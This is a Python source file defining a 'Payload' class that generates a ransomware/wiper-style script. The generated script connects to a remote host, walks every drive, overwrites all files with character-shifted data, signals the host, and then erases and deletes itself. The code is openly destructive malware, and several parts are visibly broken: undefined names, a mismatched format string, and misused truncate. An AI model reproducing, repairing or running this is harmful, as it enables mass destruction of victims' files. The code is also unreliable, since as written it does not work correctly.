class Payload:
    def __init__(self, host,port, strs):
        self.host,self.port,self.strs  = host,port,strs
    def create(self):
        return """
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(('{host}' , int({port})))
from os import walk\nfrom string import ascii_lower as a
for l in a:\n\ttry :\n\t\topen(l +':\\')\n\texcept:\n\t\tpass\n\telse :ds.append(l)
for d in ds:\n\tfor r, _, fs in walk(d):\n\t\tif len(fs) == 0:\n\t\t\tpass\n\t\tfor f in fs:\n\t\t\twith open(r +'\\' +f, "rb+") as f:
\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {})for l in fd))
conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
        """.format(host = self.host, port = str(port))